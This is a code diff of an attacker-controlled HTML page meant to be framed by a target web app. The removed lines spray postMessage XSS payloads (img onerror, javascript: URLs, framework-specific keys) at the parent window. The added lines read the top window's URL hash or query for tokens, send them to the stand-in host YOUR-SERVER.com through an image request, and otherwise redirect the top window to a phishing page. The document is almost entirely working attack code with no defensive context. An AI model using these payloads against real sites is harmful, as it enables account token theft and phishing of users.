@@ -2,30 +2,16 @@
 <html>
 <body>
 <script>
-// Spray postMessage payloads at the parent window
-// If the parent app has an insecure message handler, one of these may trigger XSS
-
-const payloads = [
-  // Common framework patterns
-  '<img src=x onerror=alert(document.domain)>',
-  '{"type":"redirect","url":"javascript:alert(document.domain)"}',
-  '{"action":"navigate","href":"javascript:alert(document.domain)"}',
-  '{"html":"<img src=x onerror=alert(document.domain)>"}',
-  '{"template":"<script>alert(document.domain)<\\/script>"}',
-  '{"callback":"alert","args":["document.domain"]}',
-  '{"event":"load","data":"<iframe srcdoc=\\"<script>alert(document.domain)</script>\\">"}',
-  // Angular/React patterns  
-  '{"__zone_symbol__":"alert(document.domain)"}',
-  '{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(document.domain)>"}}',
-];
-
-payloads.forEach((p, i) => {
-  setTimeout(() => {
-    window.parent.postMessage(p, '*');
-  }, i * 100);
-});
-
-console.log("postMessage spray complete");
+// If sandbox allows top-navigation, steal URL fragments/params
+// that may contain tokens
+try {
+  // Some apps put tokens in the URL hash
+  var leak = window.top.location.hash || window.top.location.search;
+  new Image().src = "https://YOUR-SERVER.com/log?leak=" + encodeURIComponent(leak);
+} catch(e) {
+  // Cross-origin: can't read, but CAN write (navigate)
+  window.top.location = "https://YOUR-SERVER.com/phish";
+}
 </script>
 </body>
 </html>
